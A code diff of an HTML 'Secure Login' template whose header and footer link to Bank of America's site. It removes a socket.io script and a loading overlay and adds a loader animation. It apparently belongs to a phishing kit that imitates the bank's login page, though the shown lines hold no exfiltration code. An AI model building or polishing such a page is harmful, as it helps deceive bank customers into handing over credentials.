@@ -8,23 +8,29 @@
   <title>Secure Login</title>
   <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/main.css">
-  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
   <script src="/js/jquery.js"></script>
   <script src="/js/jquery.mask.min.js"></script>
 </head>
 
 <body>
-  <a href="https://secure.bankofamerica.com/" style="z-index: 999!important;position: relative;" class="">
-    <header></header>
 
+<div id="pageLoader">
+  <div class="loaderBox">
+    <div class="lds-default">
+      <div></div><div></div><div></div><div></div>
+      <div></div><div></div><div></div><div></div>
+      <div></div><div></div><div></div><div></div>
+    </div>
+  </div>
+</div>
+  <a href="https://secure.bankofamerica.com/">
+    <header></header>
   </a>
-  
 
   <main class="col-small-up">
-  <div style="display:none" id="loadingOverlay">
-		  <span id="loader" class="loader"></span>
-		</div>
     <div class="main-section flex-grid-nest">
+    
+    
       <div class="cb-container">
         <div class="row cb-collapse">
           <div class="columns">
@@ -72,12 +78,11 @@
     </div>
   </main>
 
-  <a href="https://secure.bankofamerica.com/" style="z-index: 999!important;position: relative;" >
+  <a href="https://secure.bankofamerica.com/">
     <footer></footer>
   </a>
 
   <script src="/js/main.js"></script>
-  
   @!section('script')
 </body>
 
